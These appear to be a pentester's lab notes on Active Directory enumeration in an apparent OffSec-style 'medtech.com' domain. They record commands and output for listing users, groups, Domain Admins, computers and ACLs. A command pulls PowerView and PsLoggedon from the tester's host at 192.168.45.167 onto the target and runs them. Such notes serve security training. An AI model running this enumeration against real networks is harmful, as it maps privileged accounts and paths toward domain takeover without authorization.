get ad users
```
net user /domain
```

```
PS C:\Tools> net user /domain
net user /domain
The request will be processed at a domain controller for domain medtech.com.


User accounts for \\DC01.medtech.com

-------------------------------------------------------------------------------
Administrator            Guest                    joe                      
krbtgt                   leon                     mario                    
offsec                   peach                    wario                    
yoshi                    
The command completed with one or more errors.
```

get ad groups
```
net group /domain
```

```
PS C:\Tools> net group /domain 
net group /domain
The request will be processed at a domain controller for domain medtech.com.


Group Accounts for \\DC01.medtech.com

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed with one or more errors.
```

get group information
```
net group "Domain Admins" /domain
```

```
PS C:\Tools> net group "Domain Admins" /domain
net group "Domain Admins" /domain
The request will be processed at a domain controller for domain medtech.com.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            leon                     
The command completed successfully.
```

Domain Controller hostname
```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

```
PS C:\Tools> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()


Forest                  : medtech.com
DomainControllers       : {DC01.medtech.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : DC01.medtech.com
RidRoleOwner            : DC01.medtech.com
InfrastructureRoleOwner : DC01.medtech.com
Name                    : medtech.com
```

find domain controller address
```
nslookup DC01.medtech.com
```

```
PS C:\Tools> nslookup DC01.medtech.com
nslookup DC01.medtech.com
Server:  UnKnown
Address:  172.16.219.10

Name:    DC01.medtech.com
Address:  172.16.219.10

PS C:\Tools> net view
```

PowerView
```
wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

```
python -m http.server
```

downlaod PowerView
```
iwr http://192.168.45.167:8080/PowerView.ps1 -outfile PowerView.ps1
```

```
Import-Module .\PowerView.ps1
```

Get domain users
```
Get-NetUser | select cn
```

```
PS C:\Tools> Get-NetUser | select cn
Get-NetUser | select cn

cn           
--           
Administrator
Guest        
offsec       
krbtgt       
leon         
joe          
peach        
mario        
wario        
yoshi        
```

Get domain groups
```
Get-NetGroup | select cn
```

```
PS C:\Tools> Get-NetGroup | select cn
Get-NetGroup | select cn

cn                                     
--                                     
Administrators                         
Users                                  
Guests                                 
Print Operators                        
Backup Operators                       
Replicator                             
Remote Desktop Users                   
Network Configuration Operators        
Performance Monitor Users              
Performance Log Users                  
Distributed COM Users                  
IIS_IUSRS                              
Cryptographic Operators                
Event Log Readers                      
Certificate Service DCOM Access        
RDS Remote Access Servers              
RDS Endpoint Servers                   
RDS Management Servers                 
Hyper-V Administrators                 
Access Control Assistance Operators    
Remote Management Users                
Storage Replica Administrators         
Domain Computers                       
Domain Controllers                     
Schema Admins                          
Enterprise Admins                      
Cert Publishers                        
Domain Admins                          
Domain Users                           
Domain Guests                          
Group Policy Creator Owners            
RAS and IAS Servers                    
Server Operators                       
Account Operators                      
Pre-Windows 2000 Compatible Access     
Incoming Forest Trust Builders         
Windows Authorization Access Group     
Terminal Server License Servers        
Allowed RODC Password Replication Group
Denied RODC Password Replication Group 
Read-only Domain Controllers           
Enterprise Read-only Domain Controllers
Cloneable Domain Controllers           
Protected Users                        
Key Admins                             
Enterprise Key Admins                  
DnsAdmins                              
DnsUpdateProxy               
```

Get member of  "Domain Admins"
```
Get-NetGroup "Domain Admins" | select member
```

```
PS C:\Tools> Get-NetGroup "Domain Admins" | select member
Get-NetGroup "Domain Admins" | select member

member                                                                           
------                                                                           
{CN=leon,CN=Users,DC=medtech,DC=com, CN=Administrator,CN=Users,DC=medtech,DC=com}
```

Get Computers
```
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

```
PS C:\Tools> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

dnshostname           operatingsystem              operatingsystemversion
-----------           ---------------              ----------------------
DC01.medtech.com      Windows Server 2022 Standard 10.0 (20348)          
FILES02.medtech.com   Windows Server 2022 Standard 10.0 (20348)          
DEV04.medtech.com     Windows Server 2022 Standard 10.0 (20348)          
CLIENT01.medtech.com  Windows 11 Enterprise        10.0 (22000)          
PROD01.medtech.com    Windows Server 2022 Standard 10.0 (20348)          
CLIENT02.medtech.com  Windows 11 Enterprise        10.0 (22000)          
WEB02.dmz.medtech.com Windows Server 2022 Standard 10.0 (20348) 
```

```
Get-NetSession -ComputerName WEB02.dmz.medtech.com -Verbose
```

Get object ACL
```
Get-ObjectAcl -Identity joe
```

```
ObjectDN               : CN=joe,CN=Users,DC=medtech,DC=com
ObjectSID              : S-1-5-21-976142013-3766213998-138799841-1106
ActiveDirectoryRights  : ReadProperty
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectAceType : bf967aba-0de6-11d0-a285-00aa003049e2
BinaryLength           : 60
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 16
SecurityIdentifier     : S-1-5-32-554
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None

ObjectDN              : CN=joe,CN=Users,DC=medtech,DC=com
ObjectSID             : S-1-5-21-976142013-3766213998-138799841-1106
ActiveDirectoryRights : CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, 
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 917951
SecurityIdentifier    : S-1-5-21-976142013-3766213998-138799841-512
AceType               : AccessAllowed
AceFlags              : None
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
AuditFlags            : None


ObjectDN              : CN=joe,CN=Users,DC=medtech,DC=com
ObjectSID             : S-1-5-21-976142013-3766213998-138799841-1106
ActiveDirectoryRights : CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, 
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 917951
SecurityIdentifier    : S-1-5-21-976142013-3766213998-138799841-519
AceType               : AccessAllowed
AceFlags              : None
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
AuditFlags            : None
```

```
Convert-SidToName S-1-5-21-976142013-3766213998-138799841-1106,S-1-5-21-976142013-3766213998-138799841-512,S-1-5-21-976142013-3766213998-138799841-519
```

```
PS C:\Tools> Convert-SidToName S-1-5-21-976142013-3766213998-138799841-1106,S-1-5-21-976142013-3766213998-138799841-512,S-1-5-21-976142013-3766213998-138799841-519
Convert-SidToName S-1-5-21-976142013-3766213998-138799841-1106,S-1-5-21-976142013-3766213998-138799841-512,S-1-5-21-976142013-3766213998-138799841-519
MEDTECH\joe
MEDTECH\Domain Admins
MEDTECH\Enterprise Admins
```



Download psloggedon.exe
```
wget https://download.sysinternals.com/files/PSTools.zip
unzip ./PsTools.zip
```

```
iwr http://192.168.45.167:8080/PsLoggedon.exe -outfile psloggedon.exe
```

```
./psloggedon.exe \\DC01 -accepteula
./psloggedon.exe \\FILES02 -accepteula
./psloggedon.exe \\CLIENT01 -accepteula
./psloggedon.exe \\CLIENT02 -accepteula
```